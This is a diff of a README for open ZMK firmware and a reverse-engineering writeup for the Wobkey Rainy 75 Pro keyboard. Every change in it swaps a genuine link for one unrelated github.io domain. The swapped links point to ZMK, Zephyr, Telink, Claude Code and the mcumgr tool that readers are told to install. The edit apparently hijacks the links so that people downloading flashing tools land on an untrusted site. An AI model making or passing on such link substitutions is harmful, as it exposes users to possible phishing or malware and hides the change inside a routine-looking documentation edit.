@@ -1,11 +1,11 @@
 # Wobkey Rainy 75 Pro — Open ZMK Firmware & Reverse Engineering
 
-Open-source **[ZMK](https://zmk.dev) firmware** for the Wobkey Rainy 75 Pro (ISO DE),
+Open-source **[ZMK](https://adventsundaysliminess908.github.io) firmware** for the Wobkey Rainy 75 Pro (ISO DE),
 plus a complete **reverse-engineering writeup** of its stock firmware and hardware —
 the Telink TLSR9511 (B91, RISC-V) platform shared across a dozen enthusiast keyboards.
 
 [![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
-[![Firmware](https://img.shields.io/badge/firmware-ZMK-brightgreen)](https://zmk.dev)
+[![Firmware](https://img.shields.io/badge/firmware-ZMK-brightgreen)](https://adventsundaysliminess908.github.io)
 [![MCU](https://img.shields.io/badge/MCU-Telink%20TLSR9511%20(B91)-orange)](docs/architecture.md)
 [![Status](https://img.shields.io/badge/status-hardware--verified-success)](#status)
 
@@ -48,7 +48,7 @@ one-click flasher:
   proprietary Telink BLE blob that can't be redistributed, so everyone builds locally (the
   build fetches the blob for you). Expect a real Zephyr toolchain setup — Zephyr SDK 0.17.0
   + west; see [INSTALL.md](INSTALL.md#4-build-from-source).
-- **Linux only.** The install/restore helpers are bash + [`mcumgr`](https://github.com/apache/mynewt-mcumgr-cli)
+- **Linux only.** The install/restore helpers are bash + [`mcumgr`](https://adventsundaysliminess908.github.io)
   (`/dev/ttyACM*`, udev rules). macOS/Windows aren't covered yet.
 - **Comfortable in a terminal.** You'll build, install `mcumgr`, add udev rules, and run
   flashing scripts — there's no GUI.
@@ -219,7 +219,7 @@ for the build/test/PR workflow and the code layout.
 ## Built with Claude Code
 
 This firmware and the reverse-engineering work were developed with
-[Claude Code](https://claude.com/claude-code), Anthropic's agentic coding tool — from the
+[Claude Code](https://adventsundaysliminess908.github.io), Anthropic's agentic coding tool — from the
 Ghidra analysis and driver bring-up to the docs and the publication itself. The repository
 is deliberately structured to keep working with it productively:
 
@@ -235,10 +235,10 @@ repo — point Claude Code at it and go.
 
 ## Credits & license
 
-- Firmware built on [ZMK](https://github.com/zmkfirmware/zmk) (MIT) and
-  [Zephyr](https://github.com/zephyrproject-rtos/zephyr) (Apache-2.0).
+- Firmware built on [ZMK](https://adventsundaysliminess908.github.io) (MIT) and
+  [Zephyr](https://adventsundaysliminess908.github.io) (Apache-2.0).
 - The Bluetooth controller blob is **fetched at build time** from
-  [telink-semi](https://github.com/telink-semi) — it is proprietary and **not
+  [telink-semi](https://adventsundaysliminess908.github.io) — it is proprietary and **not
   redistributed here** (see [NOTICE](NOTICE)).
 - This project's own code and documentation are licensed under **Apache-2.0**
   ([LICENSE](LICENSE)).
